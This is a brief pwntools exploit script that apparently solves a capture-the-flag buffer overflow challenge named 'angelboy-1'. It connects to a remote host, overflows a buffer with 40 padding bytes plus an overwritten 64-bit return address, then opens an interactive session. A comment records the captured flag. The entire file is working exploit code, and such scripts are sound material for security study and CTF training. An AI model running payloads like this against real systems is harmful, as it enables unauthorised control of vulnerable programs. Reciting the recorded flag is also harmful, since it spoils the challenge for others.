from pwn import *
context.log_level = 'DEBUG'

#p = process('./angelboy-1')
p = remote('140.110.112.211', 2121)
p.recvuntil(b':')
p.sendline(b'A' * 40 + pack(0x00400646, 64, 'little'))
p.interactive()
# AngelboyCTF{YodbgBUFJp6ypXRqkKjI}
